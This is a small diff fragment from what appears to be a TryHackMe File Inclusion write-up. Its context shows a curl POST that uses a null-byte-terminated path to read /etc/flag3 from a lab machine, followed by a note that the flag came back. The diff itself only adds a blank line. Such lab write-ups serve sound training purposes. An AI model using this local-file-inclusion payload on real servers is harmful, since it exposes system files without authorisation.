@@ -18,5 +18,6 @@ $ curl -X POST -d 'file=/etc/flag3%00' http://MACHINE_IP/challenges///////chall3
 ```
 
 It so returned the flag.
+
 ![alt text](https://github.com/ulissesj/TryHackMe-writeups/blob/main/FileInclusion/flag3/3_flag3.PNG "Challenge 3 - Flag 3")
 
